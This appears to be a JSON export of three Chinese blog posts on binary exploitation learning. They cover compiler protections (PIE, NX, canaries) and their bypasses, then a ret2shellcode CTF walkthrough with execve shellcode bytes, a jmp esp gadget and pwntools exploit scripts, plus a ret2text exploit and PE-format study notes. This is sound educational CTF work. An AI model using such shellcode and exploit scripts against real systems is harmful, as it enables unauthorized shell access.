[{"title":"PWN-shellcode","url":"/2025/06/03/PWN-shellcode/","content":"PWN-shellcode在开始之前呢首先我们先了解一下编译器开启的一些保护措施\n一、PIEPIE（Position Independent Executable） 是现代操作系统中用于提升安全性的一个关键机制。它允许可执行文件在运行时被加载到内存中的任意地址，而不是一个固定的地址，从而配合 ASLR（Address Space Layout Randomization） 进行地址空间的随机化，防止攻击者预测代码地址。\n\n\n什么是 PIE？PIE（Position Independent Executable，位置无关可执行文件）是一种编译方式，使得整个程序（包括代码段和数据段）都支持位置无关（Position Independent Code, PIC）。PIE 程序在加载时可以被映射到内存中的任意地址。\n为什么需要 PIE？PIE 是为了支持 ASLR。如果程序是固定地址加载，即使系统启用了 ASLR，也无法随机化主程序的加载地址，攻击者可以轻易定位到关键代码位置。\nPIE 和 PIC 的区别\n\n\n特性\nPIC\nPIE\n\n\n\n应用\n通常用于共享库（.so）\n用于整个可执行文件\n\n\n是否独立执行\n否（依附主程序）\n是（本身是一个独立程序）\n\n\n支持ASLR\n否（主程序不支持）\n是（主程序支持）\n\n\n\nPIE 的工作原理\nPIE 编译时生成的是 位置无关代码（通过寄存器偏移访问全局数据、函数指针等），与共享库相似。\n加载器可以将 PIE 可执行文件映射到随机的内存地址。\n所有符号引用通过基址加偏移的方式计算地址，而非固定地址。\n\n\n如何启用和识别 PIE编译启用 PIE\n在使用 gcc 或 clang 时，加上以下参数：\ngcc -fPIE -pie main.c -o main\n\nPIE 的优点与缺点优点：\n\n支持 ASLR，增强安全性，降低 Exploit 的可靠性。\n防止 ROP（Return Oriented Programming）攻击中 gadget 地址的硬编码。\n\n缺点：\n\n运行时性能稍有下降（需要计算偏移地址）。\n编译和链接略复杂（需要处理基地址偏移等问题）。\n即使编译的时候开启了PIE而操作系统没有开启ASLR那么PIE是无效的 因为PIE是基于ASLR实现的\n\n二、NXNX保护（No eXecute &#x2F; 数据不可执行） 是现代操作系统中的一项关键内存安全保护机制，用于防止恶意代码执行。它主要通过标记内存页是否允许执行来阻止 缓冲区溢出 和 Shellcode 注入攻击。\n\n什么是 NX 保护？NX（No eXecute），也叫 DEP（Data Execution Prevention），是一种内存页访问权限控制技术。其核心思想是：\n\n只允许代码段执行，禁止数据段执行。\n\n攻击者常常通过缓冲区溢出将 Shellcode 注入堆栈、堆中，如果这些内存区域标记为不可执行，则注入的代码就无法被 CPU 执行，从而阻止了漏洞利用。\n在编译时启用 NX通常，现代编译器默认会生成 NX 支持的可执行文件。如果你使用的是较老的系统或手动编译，建议添加以下编译器参数：\ngcc -z noexecstack main.c -o main\n\n三、绕过 NX 的常见方法（供防御者理解）虽然 NX 能阻止代码注入执行，但无法防止地址复用。攻击者常用以下技巧绕过 NX：\n\n\n\n绕过方式\n说明\n\n\n\nROP（Return Oriented Programming）\n利用已有的代码片段（gadget）拼装攻击链\n\n\nret2libc\n重定向控制流执行 libc 中的 system(&quot;/bin/sh&quot;)\n\n\nJIT Spraying\n针对浏览器 JIT 编译器进行攻击，构造可执行段\n\n\nmprotect&#x2F;mmap 执行页改写\n利用已知函数改变页权限使数据可执行（需泄漏地址）\n\n\n因此，实际防护中应配合 ASLR、Stack Canary、RELRO 等机制一起使用。\n三、Canary 的工作机制栈帧布局改变（有 Canary 时）以 x86 为例，函数栈帧布局：\nsql复制编辑+---------------------+| 返回地址            | ← old EBP+---------------------+| Canary（金丝雀）    |+---------------------+| 局部变量/缓冲区等   |+---------------------+\n\n运行流程\n函数调用时：编译器插入代码生成随机的 Canary 值并压入栈中。\n函数返回前：编译器插入代码检测栈上的 Canary 值是否被修改。\n若值被篡改：说明存在栈溢出攻击，程序触发 __stack_chk_fail()，立刻终止运行。\n\n\nCanary 的类型GCC 实现中，常见的 Canary 类型有三种：\n\n\n\n类型\n特点\n\n\n\nTerminator Canary\n包含不可打印字符（如 0x00、0x0D、0x0A），防止 strcpy() 等函数覆盖它\n\n\nRandom Canary\n每次程序运行时随机生成，攻击者很难猜到其值\n\n\nTLS-based Canary\n每线程独立一个 Canary，提高多线程程序的安全性\n\n\n\n编译启用 Canary\nGCC 编译选项\n\n\n\n\n参数\n说明\n\n\n\n-fstack-protector\n保护包含数组等变量的函数\n\n\n-fstack-protector-strong\n保护更多函数（推荐）\n\n\n-fstack-protector-all\n所有函数都启用 Canary\n\n\ngcc -fstack-protector-strong -o main main.c\n\nCanary 绕过难点与攻击方式虽然 Canary 提高了安全性，但理论上不是绝对不可绕过的。常见绕过方式包括：\n\n\n\n绕过方法\n原理\n\n\n\n信息泄露\n通过漏洞泄露 Canary 的值，再构造 Payload\n\n\n非溢出攻击\n使用 UAF、格式化字符串、Heap 攻击等绕过 Canary\n\n\n不破坏 Canary 的攻击\n比如 ROP，不需要覆盖返回地址或覆盖前先保留 Canary\n\n\n覆盖结构体指针\nCanary 只保护返回地址，不保护所有栈数据\n\n\nCanary 的局限性\n\n\n局限点\n描述\n\n\n\n只检测返回地址破坏\n无法防止其他类型的数据破坏\n\n\n信息泄露可被绕过\n一旦泄漏 Canary 值，保护失效\n\n\n性能影响（极小）\n每个函数都多一次 Canary 检查（几乎忽略不计）\n\n\n那么shellcode是什么？shellcode 其实就是一小段代码 可以用于软件漏洞利用的载荷 被称为 shellcode 是因为它通常启动一个命令终端 攻击者可以通过这个终端控制受害的计算机 但是所有执行类似任务的代码片段都可以称作shellcode Shellcode通常是以机器码形式编写的\n在Pwntools中 内置了一些shellcode与编译方式 只需要使用以下方式就可以调用\nprint(shellcraft.amd64.sh())\n\n输出如下所示\n└─[$]&gt; /usr/bin/python3 /home/pwn/桌面/pwn/山化课程/day02-ret2shellcode/testshellcode.py    /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */    /* push b&#x27;/bin///sh\\x00&#x27; */    push 0x68    mov rax, 0x732f2f2f6e69622f    push rax    mov rdi, rsp    /* push argument array [&#x27;sh\\x00&#x27;] */    /* push b&#x27;sh\\x00&#x27; */    push 0x1010101 ^ 0x6873    xor dword ptr [rsp], 0x1010101    xor esi, esi /* 0 */    push rsi /* null terminate */    push 8    pop rsi    add rsi, rsp    push rsi /* &#x27;sh\\x00&#x27; */    mov rsi, rsp    xor edx, edx /* 0 */    /* call execve() */    push SYS_execve /* 0x3b */    pop rax    syscall\n\n套用asm函数 就可以得到对应的shellcode 但是注意在调用前需要设置架构\ncontext.arch = &#x27;amd64&#x27;print(asm(shellcraft.amd64.sh()))\n\n输出如下所示\nb&#x27;jhH\\xb8/bin///sPH\\x89\\xe7hri\\x01\\x01\\x814$\\x01\\x01\\x01\\x011\\xf6Vj\\x08^H\\x01\\xe6VH\\x89\\xe61\\xd2j;X\\x0f\\x05&#x27;\n\n\n\nret2shellcode 即控制程序执行shellcode代码 shellcode指的是用于完成某个功能的汇编代码 常见的功能主要是获取目标系统的shell\n一般来说shellcode需要我们自已填充 这其实是另外一种典型的利用方法 即此时我们需要自已去填充一些可执行的代码 这种手法不需要程序内部具有system之类的函数 在最早的时候十分常见\n在栈溢出的基础上 要想执行shellcode 需要对应的binary在运行时 shellcode所在的区域具有可执行权限\n\n第一种利用方式\n根据函数调用约定 在一个函数执行的最后是一个 leave ret \n实质是\nmov esp,ebp\npop ebp\npop eip\n这时候我们在填充一个shellcode 然后控制返回地址为 jmp esp 即可利用\n\n例题使用checksec查保护\nchecksec --file=b0verfl0w\n\n─[$]&gt; checksec --file=b0verfl0wRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH\tSymbols\t\tFORTIFY\tFortified\tFortifiable\tFILEPartial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   74 Symbols\t  No\t0\t2b0verfl0w\n\n未开启任何保护 \nint vul()&#123;  char s[32]; // [esp+18h] [ebp-20h] BYREF  puts(&quot;\\n======================&quot;);  puts(&quot;\\nWelcome to X-CTF 2016!&quot;);  puts(&quot;\\n======================&quot;);  puts(&quot;What&#x27;s your name?&quot;);  fflush(stdout);  fgets(s, 50, stdin);  printf(&quot;Hello %s.&quot;, s);  fflush(stdout);  return 1;&#125;\n\n这是函数的主函数 经过分析之后发现并没有 bin/sh 所以我们可以想到的是用shellcode 毕竟没有开启NX保护\n 定位泄露位置可以通过ida计算\n-0000000000000020     char s;-000000000000001F     // padding byte-000000000000001E     // padding byte-000000000000001D     // padding byte-000000000000001C     // padding byte-000000000000001B     // padding byte-000000000000001A     // padding byte-0000000000000019     // padding byte-0000000000000018     // padding byte-0000000000000017     // padding byte-0000000000000016     // padding byte-0000000000000015     // padding byte-0000000000000014     // padding byte-0000000000000013     // padding byte-0000000000000012     // padding byte-0000000000000011     // padding byte-0000000000000010     // padding byte-000000000000000F     // padding byte-000000000000000E     // padding byte-000000000000000D     // padding byte-000000000000000C     // padding byte-000000000000000B     // padding byte-000000000000000A     // padding byte-0000000000000009     // padding byte-0000000000000008     // padding byte-0000000000000007     // padding byte-0000000000000006     // padding byte-0000000000000005     // padding byte-0000000000000004     // padding byte-0000000000000003     // padding byte-0000000000000002     // padding byte-0000000000000001     // padding byte+0000000000000000     _DWORD __saved_registers;+0000000000000004     _UNKNOWN *__return_address;\n\ns -&gt; return 是 0x20 + 4 &#x3D; 32+4 &#x3D; 36\n但是呢 这道题比较特殊 因为他限制了输入的字符 fgets(s, 50, stdin);\n只能输入50个字符 但是pwntools生成的shellcode字符数过于庞大 且会被截断\n所以我们要换个思路\n首先 我们是否可以通过 ret的特性(ret = jmp esp add esp,4)来进行移植跳转呢 原理就是通过想栈上直接写shellcode 然后再通过 jmp esp的方式去跳转到shellcode的头呢\n这样是可行的 我们开始构造 首先我们需要自已编写一个shellcode 如下所示\n; global _start; _start:; xor eax,eax  ;//eax置0; xor edx,edx  ;//edx置0; push edx; push sh; push bin   ;//将/bin/sh入栈; mov ebx,esp   ;//ebx指向/bin/sh这个字符串; xor ecx,ecx; mov al,0Bh    ;//eax置为execve函数的中断号; int 80h       ;//调用软中断; \tsection .data; \t\tsh:\tdb &#x27;/sh&#x27;;         bin:db &#x27;/bin&#x27;\n\n或者自已去shellcode网站下载一段shellcode\n紧接着我们还得计算出这段shllcode的长度 因为我们要把剩下的字节给补成垃圾数据 \n然后我们现在需要的就是一个 jmp esp的地址\n之后我们就让 ret 处让他 jmp_esp 用 ropper 搜索即可\n(Pwn-py312) (base) cccccchow@Chow:~/pwn/AAA/山化课程/day02-ret2shellcode$ ropper(ropper)&gt; file b0verfl0w[INFO] Load gadgets from cache[LOAD] loading... 100%[LOAD] removing double gadgets... 100%[INFO] File loaded.(b0verfl0w/ELF/x86)&gt; jmp espJMP Instructions================0x08048504: jmp esp; 1 gadgets found(b0verfl0w/ELF/x86)&gt; \n\n或者用ROPgadget搜索也可以\nROPgadget --binary b0verfl0w --only &quot;jmp&quot;\n\n0x080483ab : jmp 0x80483900x080484f2 : jmp 0x80484700x08048611 : jmp 0x80486200x0804855d : jmp dword ptr [ecx + 0x804a040]0x08048550 : jmp dword ptr [ecx + 0x804a060]0x0804876f : jmp dword ptr [ecx]0x08048504 : jmp esp\n\n0x08048504 就找到了我们的地址\n跳转到 esp之后我们还得构造一个东西 那就是 让esp指向shellcode的头部 首先我们计算\n-0000000000000020     char s;-000000000000001F     // padding byte-000000000000001E     // padding byte-000000000000001D     // padding byte-000000000000001C     // padding byte-000000000000001B     // padding byte-000000000000001A     // padding byte-0000000000000019     // padding byte-0000000000000018     // padding byte-0000000000000017     // padding byte-0000000000000016     // padding byte-0000000000000015     // padding byte-0000000000000014     // padding byte-0000000000000013     // padding byte-0000000000000012     // padding byte-0000000000000011     // padding byte-0000000000000010     // padding byte-000000000000000F     // padding byte-000000000000000E     // padding byte-000000000000000D     // padding byte-000000000000000C     // padding byte-000000000000000B     // padding byte-000000000000000A     // padding byte-0000000000000009     // padding byte-0000000000000008     // padding byte-0000000000000007     // padding byte-0000000000000006     // padding byte-0000000000000005     // padding byte-0000000000000004     // padding byte-0000000000000003     // padding byte-0000000000000002     // padding byte-0000000000000001     // padding byte+0000000000000000     _DWORD __saved_registers;+0000000000000004     _UNKNOWN *__return_address;\n\n从 __return_address 到 s 是24个字节 但是我们中间还加了一个 jmp esp 这又占 四个字节 所以我们需要写成这样 sub esp,0x28; jmp esp 这样才对 之后我们的payload就构造完成了 脚本如下：\nfrom pwn import*# p = process(&quot;b0verfl0w&quot;)p = remote(&quot;node5.buuoj.cn&quot;,28176)shellcode = b&quot;\\x31\\xc0\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xb0\\x0b\\xcd\\x80&quot;shellcode_len = len(shellcode) # shellcode_len = 23print(shellcode_len)jmp_esp = 0x08048504sub_esp_jmp = asm(&#x27;sub esp,0x28;jmp esp&#x27;)#    0:   83 ec 28                sub    $0x28,%esp#    3:   ff e4                   jmp    *%espprint(sub_esp_jmp)sub_len = len(sub_esp_jmp)payload = shellcode   #往栈上写shellcode#补填字节到溢出点 溢出点 = 36 应该是补填了 36-23 = 13payload += (0x24-shellcode_len) * b&#x27;a&#x27;#根据 ret的特性 首先是先jmp esp 之后 add esp,4 我们可以让他先执行完 add esp,4 然后进行jmp esppayload += p32(jmp_esp)#跳回栈顶payload += sub_esp_jmpp.sendline(payload)p.interactive()\n\n\n\n","tags":["pwn"]},{"title":"PWN-简单栈溢出","url":"/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/","content":"PWN-简单栈溢出介绍pwn这门课程简单来说就是通过二进制的形式去找到某台服务器存在哪些漏洞 与web不同的是他大部分的知识都是基于汇编组成的 在 CTF-Wiki 里面的介绍则是这样的:\n\n栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：\n\n程序必须向栈上写入数据。\n写入的数据大小没有被良好地控制。\n\n\n\n则 栈的介绍如下：\n基本栈介绍 ¶\n栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示（维基百科）。两种操作都操作栈顶，当然，它也有栈底。\n\n高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，程序的栈是从进程地址空间的高地址向低地址增长的。\n\n这些是简单的栈介绍\n首先 栈是一种特殊的数据结构 他存储了 function runtime 的参数、变量和返回地址他在一次函数调用中是不可或缺的重要部分，其中软件的架构又分为两种\nx86 和 x64 \n这两种在参数和变量的在栈存储形式上有些不同 例如\nx86 的所有参数通过 栈 从右到左依次压入 可用以下代码作为示例 使用 visual stdio 编译 x86 版本观查栈\n#include &lt;iostream&gt;int func(int _param1, int _param2, int _param3, int _param4, int _param5) &#123;\treturn _param1 + _param2 + _param3 + _param4 + _param5;&#125;int main()&#123;\tfunc(1, 2, 3, 4, 5);\tstd::cout &lt;&lt; &quot;helloworld\\n&quot;;\tgetchar();&#125;\n\n\n如图所示 我们定位到了 main 函数 然后我们在 func  处下断点 我们让他继续执行到func 执行到 call的时候我们观察栈的变化\n\n如图所示 这是一个从低地址到高地址的显示方式 但是在入栈的时候 他是 从高地址到低地址从右往左参数依次入栈\n然后我们进入call继续查看 进入call的同时我们发现 他先是压入了一个地址 这个地址就是 call 所在地址 + 5 的字节\n所以call xxxxxxxx就等效于 push eip + 5 call的机器码占用一个字节 然而地址占用4个字节 其次又跳转到了 后面的地址处 所以call指令做了两件事 先是压入一个返回地址 接着又是进行了一次 jmp 跳转 然后我们接着看\n在跳转过来的函数头部我们发现了两条指令 push ebp mov ebp esp 那么这是什么意思呢？\n其实是 典型的 x86 函数栈帧初始化 \n首先将当前的 ebp 寄存器的值压入栈 也就是保存上个函数的栈底地址 (push ebp)\n之后把上个函数的栈顶作为当前函数的栈底 (mov ebp esp)\n之后就是进行一系类的加法操作 到了 pop ebp的时候 就要销毁此栈帧恢复上一个函数的栈帧了\n然而我们可以发现 函数参数是通过 ebp + n*4 的方式进行访问的 这很关键\n直到执行到 ret 我们会发现 他的效果就等于 jmp esp &amp; add esp,4   为什么这么说 我们接着分析栈\n\n我们可以发现现在 esp=ebp 为什么说 ret 是 jmp [esp]呢\n因为我们执行完 pop ebp 他就变成了这样\n\n也就是返回到刚才call保存的返回值了 \n接着我们来看下x64的栈 \nx64分为两种编译器 在 Linux、FreeBSD、macOS 中普遍使用 System V AMD64 ABI \n\n前六个整型或指针参数依次保存在 RDI, RSI, RDX, RCX, R8 和 R9 寄存器中，如果还有更多的参数的话才会保存在栈上。\n内存地址不能大于 0x00007FFFFFFFFFFF，6 个字节长度，否则会抛出异常。\n\n但在Windows上是 Microsoft x64 calling convention 也称作：\n\nWindows x64 ABI\n\nWindows x64 调用约定\n\n\n他的参数入栈形式如下\n\n前四个整型或指针参数依次保存在 RCX, RDX, R8, R9，如果还有更多的参数的话才会保存在栈上。\n\n内存地址不能大于 0x00007FFFFFFFFFFF，6 个字节长度，否则会抛出异常。\n\n\n🔍 System V AMD64 ABI vs Microsoft x64 ABI 对比\n\n\n特性\nSystem V AMD64 ABI (Linux&#x2F;macOS)\nMicrosoft x64 ABI (Windows x64)\n\n\n\n参数传递寄存器\nRDI, RSI, RDX, RCX, R8, R9\nRCX, RDX, R8, R9\n\n\n返回值\nRAX\nRAX\n\n\n栈空间\n被调用者必须保留 red zone（128 字节）\n无 red zone（不能用栈下方空间）\n\n\n调用者保存（volatile）寄存器\nRAX, RCX, RDX, RSI, RDI, R8–R11\nRAX, RCX, RDX, R8–R11\n\n\n被调用者保存（callee-saved）\nRBX, RBP, R12–R15\nRBX, RBP, RDI, RSI, R12–R15\n\n\n参数超过寄存器\n从第 7 个参数起压栈\n从第 5 个参数起压栈\n\n\n栈对齐要求\n16 字节\n16 字节\n\n\n栈传参对齐方式\n按参数自然大小\n所有参数按 8 字节对齐\n\n\n谁清理栈\n被调用者使用 leave+ret\n调用者清理（隐含对齐）\n\n\n我这边就用Windows用作演示\n\n我们也是执行到 func 下断点 然后我们进入这个call\n我们会发现call的操作其实跟x86的call一样 也是 push RIP + 5 然后 jmp 地址\n但是这个地址并不是一个绝对地址而是 相对地址。\n相对地址跳转（RIP-relative）\n🧮 实际跳转地址计算方式\n目标地址 = 下一条指令地址 + 偏移量偏移量 = 目标地址 - 下一条指令的地址下一条指令的地址 = 目标地址 - 偏移量\n假设当前 EIP 为 0x1000，也就是 E8 的位置\nE8 占 1 字节，后面是 4 字节偏移量，下一条指令的地址是：\n0x1000 + 5 = 0x1005\n\n加上偏移量 -0x97：\n0x1005 - 0x97 = 0xF6E\n\n为什么不用绝对地址？因为：\n\n可重定位性更强：相对寻址无关内存基地址，适合代码段被加载到任意地址；\n指令短：一个有符号 32 位偏移量足以跳转 ±2GB 的范围；\n兼容 RIP-relative 模型：x64 强调基于 RIP 的寻址方式；\n\n根据这张图我们可以计算下 偏移量\n也就是 目标地址(00007FF76C6E15F0h) - 下一条地址(00007FF76C6E1687h) &#x3D; 偏移量(FFFF FFFF FFFF FF69h)\n因为要的是一个32位整数 我们要 截断 也就是 FFFF FFFF FFFF FF69h &amp; FFFF FFFFh\n&amp; 相同为1 不同为0\n0xFFFFFFFFFFFFFF69 = 11111111 11111111 11111111 11111111 11111111 11111111 11111111 011010010x00000000FFFFFFFF = 00000000 00000000 00000000 00000000 11111111 11111111 11111111 11111111\n\n\n\n之后我们继续观察函数里面的内容\n\n我们会发现 这边没有push rbp mov rbp rsp 这是为什么呢\n其实这是编译器优化的结果\n在 x64 系统下，编译器不一定使用帧指针（rbp），因为：\n\nx64 有更多寄存器可用（16 个通用寄存器），不需要保留 rbp；\nrbp 被当作普通寄存器用；\n栈偏移通过 rsp + 偏移 就可以直接访问，不需要 rbp；\n使用 rbp 反而浪费一个寄存器、增加指令数。\n\n首先就是拿出来参数放到栈上进行一系列加法之后到 ret\n这里就是 jmp [esp]的值了\n至此对函数栈的简单介绍就到这里了 然后我们要思考一个问题 ​\n假如函数的参数的大小是八个字节 但是我们输入了过多的字符 导致该参数占用10个字节 这会导致什么问题呢？🤔\n栈溢出没错 这就导致了过多的字符覆盖了低地址处的栈空间 然而这就是 栈溢出  这个问题导致的漏洞危害极大 如果我们可以把输入的字符覆盖到返回地址也就是call保存的返回值处 然后我们刚好可以构造出一段恶意代码 并且让他跳转到含有关键数据的函数 例如 system 或者 拿到了shell权限 对于我们的服务器来说是一场致命打击 💥\n举个例子 假如我们手里刚好有一个这样的程序 刚好有一个可以被栈溢出的函数 我们可以用 gdb去测试一下\n\n根据图中所示 我们可以先用gdb加载 然后再 main函数上下个断点\n我们输入 r 执行\n\n他断到了这里然后我们一直走到 gets 这个函数\n为什么要走到 gets 呢 因为 gets 这个函数他是一个输入函数 他把值输入到了栈中 但是不限制输入大小 我们可以通过这个方式 去修改最后ret的值\n在此之前我们需要通过 cyclic 指令生成一堆杂乱的数据 方便我们后续直接定位栈偏移\n\n使用 ni 指令单步\n执行到 ret 指令我们就继续使用 cyclic -l 去计算他的偏移\n\n然后这时候我们拿到了偏移量 那么怎么构造他的shell呢 这时候我们就要用 pwntools 了 exp 如下所示\n# 载入库from pwn import * # 打开进程p = process(&#x27;ret2text&#x27;)# 附加调试器# gdb.attach(p) 可以观看流程# 构建 payloadpayload = b&#x27;a&#x27;*112+p32(0x804863A)# 发送payloadp.sendline(payload)# 用户交互p.interactive()\n\n执行之后是这样的\n\n结束","tags":["pwn"]},{"title":"PElearn","url":"/2025/05/29/PElearn/","content":"PE 学习笔记(一)先来几张图片放在最前面\n\n\n\n\n\n引言本帖子大部分出自书籍 《Windows PE权威指南》因需要复习PE知识 故此记录\n地址地址有四类，它们分别是：虚拟内存地址（VA)相对虚拟内存地址（RVA）文件偏移地址（FOA)特殊地址\n扩展\n32 位环境下的Windows内存管理32位CPU的寻址能力为4GB（即2²个字节)，但有些用户的物理内存达不到这个值。于是操作系统和CPU的内存管理单元共同作用，为用户提供了虚拟内存的管理机制。即分页机制。该机制可以让用户感觉自己好像在使用4GB的内存。\n分页机制的基本原理是：操作系统假设一个进程独立拥有4GB内存，按照某个固定的大小（如4KB）将这4GB空间分成N（1M）个页。在某一时刻，所有这些页只有一部分和物理内存是对应的（所以这种机制允许物理内存比4GB小)。没有物理内存对应的页面被标记为脏(dirty)的页面，一般存储在一个名为“交换文件”的磁盘文件中。在WindowsXP系统中，交换文件为pagefile.sys，它位于系统盘的根目录，是一个系统隐藏文件。当系统需要读取未在内存中的数据时，这部分数据会将内存中不经常读写的页交换出内存，而把要读取的、位于交换文件中的页换进内存。通过这种存取机制可以让一个进程拥有比实际内存大得多的内存。利用这种机制管理的内存称为虚拟内存。\n\n虚拟内存地址VA &#x3D; 进程基地址+相对虚拟内存地址\n相对虚拟内存地址RVA &#x3D; 某个特定位置距离某个模块基地址的偏移量\n关于VA和RVA的概念如图所示\n假设模块2的基地址为0x01000000，而模块2中的某个位置距离模块2的基地址偏移为400h，那么值0x00000400就是模块2中某个位置的RVA，而值0x01000400是该位置的VA。记住，RVA是相对于模块而言的，VA是相对于整个地址空间而言的。注意RVA与具体模块相关，它有一个范围，该范围从模块的开始到模块结束，脱离开这个范围的RVA是无效的，称为越界。越界的RVA地址没有任何意义。\n文件偏移地址文件偏移地址(File Offset Address, FOA) 和内存无关，它是指某个位置距离文件头的偏移。\n特殊地址比较少见\n其他数据目录\n导出表\n导入表\n资源表\n异常表\n属性证书表\n重定位表\n调试数据\nArchitecture\nGlobal Ptr\n线程局部存储\n加载配置表\n绑定导入表\nIAT\n延时导入表\nCLR运行时头部\n\n节主要是用来存放不同类型数据(代码、数据、常量、资源等) 不同节有不同的访问权限\n对齐数据在内存中的对齐、数据在文件中的对齐、资源文件中资源数据的对齐\n内存对齐节在内存中的对齐单位必须至少是一个页的大小 32位 &#x3D; 4kb (1000h) 64位&#x3D;8kb (2000h)\n文件对齐节在文件中的对齐要小于内存中的对齐 通常会以一个物理扇区的大小作为对齐粒度的值也就是512字节 十六进制表示 (200h)\n出于节约资源的考虑，操作系统允许节在内存和文件中的对齐尺寸不一致。这就直接造成了PE在文件中和在内存中的大小也会不一致。通常情况下，PE在内存中的尺寸要比在文件中的尺寸大。用户可以自己定义这些对齐的值。\n如果内存对齐被定义为小于操作系统页的大小，则文件对齐和内存对齐的值必须一致！\n资源数据对齐资源文件中，资源字节码部分一般要求以双字（4个字节）方式对齐\nPE文件结构\n在十六位系统中 PE头和PE结构数据被当成是冗余数据 在32位系统中 刚好相反 即DOS头成为冗余数据 所谓冗余 是针对DOS头不参与 32位系统运行过程而言 尽管该部分不参与运行 但也不能把这些数据从PE结构中出去 因为DOS MZ头中有一个字段非常重要 即 IMAGE_DOS_HEADER.e_lfanew 没有他操作系统就定位不到标准的PE头部 可执行程序也就会被操作系统认为是非法的PE映像\n定位标准PE头\n由于DOS Stub的长度不固定 导致了DOS头也不是一个固定大小的数据结构 那么在WindowsPE中 既然把DOS头放在了PE的起始位置 如果去定位后面的标准PE头所在的位置呢 字段e_lfanew 即起这个作用 该字段的值是一个 相对偏移量 相对定位时需要加上DOS MZ 头的基地址 也就是说 通过以下公式可以得到PE头的绝对位置 \nPE_start = DOS MZ 基地址 + IMAGE_DOS_HEADER.e_lfanew\n\n\n大概分为五个部分 DOS MZ头 DOS Stub PE头 节表 节内容\nPE头是由 IMAGE_FILE_HEADER.SizeOfOptionalHeader 来确定大小的\n节的数量是由字段 IMAGE_FILE_HEADER.NumberOfSections来定义的 DOS Stub和节内容都是大小不确定的\n节的内容大小不确定\n\n一个标准的PE文件一般由四大部分组成:\n\nDOS头\nPE头\n节表\n节内容\n\n\n紧跟在DOS stub后面的是PE头标识 Signature 与大部分文件格式的头部结构一样 PE头部信息中有一个四字节的标识 该标识位于指针IMAGE_DOS_HEADER.e_lfanew 指向的位置 其内容固定 对应于ASCII码的字符串 “PE\\0\\0”\n标准PE头 IMAGE_FILE_HEADER紧跟在PE头标识后 即位于IMAGE_DOS_HEADER 的 e_lfanew值+4的位置 由此位置开始的20个字节为数据结构标准PE头IMAGE_FILE_HEADER的内容 该结构在微软的官方文档中被称为标准通用对象文件格式 (Common Object File Format COFF)头 它记录了PE文件的全局属性\n例如 PE文件的运行平台、PE文件类型、文件中存在节的总数等 定义如下：\ntypedef struct _IMAGE_FILE_HEADER &#123;  WORD  Machine;\t\t\t\t\t// 平台  WORD  NumberOfSections;\t\t\t// pe中节的数量  DWORD TimeDateStamp;\t\t\t\t// 文件创建日期和时间  DWORD PointerToSymbolTable;\t\t// 指向符号表(用于调试)  DWORD NumberOfSymbols;\t\t\t// 符号表中的符号数量(用于调试)  WORD  SizeOfOptionalHeader;\t\t// 扩展头结构的长度  WORD  Characteristics;\t\t\t// 文件属性&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;\n\n该结构可以用于判断PE文件是EXE还是DLL类型 不但可以通过该结构得到PE文件中节的总量，还可以当成对节区信息进行遍历操作时的循环次数\n\n\n扩展PE头 IMAGE_OPTIONAL_HEADER32typedef struct _IMAGE_OPTIONAL_HEADER &#123;  WORD                 Magic;\t\t\t\t\t\t// 魔术字  BYTE                 MajorLinkerVersion;\t\t\t// 链接器版本号  BYTE                 MinorLinkerVersion;\t\t\t// 连接器次版本号  DWORD                SizeOfCode;\t\t\t\t\t// 所有含代码的节的总大小  DWORD                SizeOfInitializedData;\t\t// 所以含已初始化数据的节的总大小  DWORD                SizeOfUninitializedData;\t\t// 所有含未初始化数据的节的大小  DWORD                AddressOfEntryPoint;\t\t\t// 程序执行入口 RVA  DWORD                BaseOfCode;\t\t\t\t\t// 代码的节的起始RVA  DWORD                BaseOfData;\t\t\t\t\t// 数据的节的起始RVA  DWORD                ImageBase;\t\t\t\t\t// 程序的建议装载地址  DWORD                SectionAlignment;\t\t\t// 内存中节的对齐粒度  DWORD                FileAlignment;\t\t\t\t// 文件中节的对齐粒度  WORD                 MajorOperatingSystemVersion;\t// 操作系统的版本号  WORD                 MinorOperatingSystemVersion;\t// 操作系统的次版本号  WORD                 MajorImageVersion;\t\t\t// 该PE的版本号\t  WORD                 MinorImageVersion;\t\t\t// 该PE的次版本号  WORD                 MajorSubsystemVersion;\t\t// 所需子系统的版本号  WORD                 MinorSubsystemVersion;\t\t// 所需子系统的次版本号  DWORD                Win32VersionValue;\t\t\t// 未用  DWORD                SizeOfImage;\t\t\t\t\t// 内存中整个PE映像的尺寸  DWORD                SizeOfHeaders;\t\t\t\t// 所有头+节表的大小  DWORD                CheckSum;\t\t\t\t\t// 校验和  WORD                 Subsystem;\t\t\t\t\t// 文件的子系统  WORD                 DllCharacteristics;\t\t\t// DLL文件特征  DWORD                SizeOfStackReserve;\t\t\t// 初始化时的栈大小  DWORD                SizeOfStackCommit;\t\t\t// 初始化时实际提交的栈大小  DWORD                SizeOfHeapReserve;\t\t\t// 初始化时保留的堆大小  DWORD                SizeOfHeapCommit;\t\t\t// 初始化时实际提交的堆大小  DWORD                LoaderFlags;\t\t\t\t\t// 与调试有关  DWORD                NumberOfRvaAndSizes;\t\t\t// 下面的数据目录结构的项目数量  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; //数据目录&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;\n\n文件执行的入口 文件被操作系统装入内存后的默认基地址 以及节在磁盘和内存中的对齐单位等信息 均可在此结构中找到 